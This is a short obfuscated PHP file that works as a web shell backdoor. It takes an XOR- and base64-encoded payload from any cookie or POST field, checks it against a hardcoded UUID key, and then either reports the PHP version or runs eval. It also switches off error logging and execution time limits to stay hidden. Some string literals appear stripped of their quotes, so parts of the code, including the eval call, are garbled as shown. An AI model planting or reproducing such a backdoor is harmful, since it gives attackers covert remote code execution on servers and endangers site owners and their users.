<?php

$k47c475b=chr;
$m958da=ord;
$p796f=strlen;
$affc=ini_set;
$ec2c=serialize;
$w3cf5=phpversion;
$scd5=unserialize;
$e3c2d4=base64_decode;
$t8a55edf=set_time_limit;
$rcf32c4=u79c;
$mc7942f39=q0da4886;
$g863e7=$_POST;
$d69b7fff=$_COOKIE;
ini_set(error_log, NULL);
ini_set(log_errors, 0);
ini_set(max_execution_time, 0);
ini_set(time_limit, 0);

$z7aa6 = NULL;
$g0200 = NULL;

$m9e75 = "a7a529cf-3f28-4030-a4b5-64ee3f3f9831";
global $m9e75;

function q0da4886($z7aa6, $l737fe5)
{
    $n4f030cb = "";

    for ($j97b599=0; $j97b599<strlen($z7aa6);)
    {
        for ($gae9f0=0; $gae9f0<strlen($l737fe5) && $j97b599<strlen($z7aa6); $gae9f0++, $j97b599++)
        {
            $n4f030cb .= chr(ord($z7aa6[$j97b599]) ^ ord($l737fe5[$gae9f0]));
        }
    }

    return $n4f030cb;
}



function u79c($z7aa6, $l737fe5)
{
    global $m9e75;

    return q0da4886(q0da4886($z7aa6, $m9e75), $l737fe5);
}

foreach ($_COOKIE as $l737fe5=>$y405e)
{
    $z7aa6 = $y405e;
    $g0200 = $l737fe5;
}

if (!$z7aa6)
{
    foreach ($_POST as $l737fe5=>$y405e)
    {
        $z7aa6 = $y405e;
        $g0200 = $l737fe5;
    }
}

$z7aa6 = unserialize(u79c(base64_decode($z7aa6), $g0200));

if (isset($z7aa6[ak]) && $m9e75==$z7aa6[ak])
{
    if ($z7aa6[a] == i)
    {
        $j97b599 = Array(
            'pv' => phpversion(),
            'sv' => '1.0-[82]',
        );
        echo serialize($j97b599);
    }
    elseif ($z7aa6[a] == e)
    {
        eval(d);
    }
    exit();
}

?>
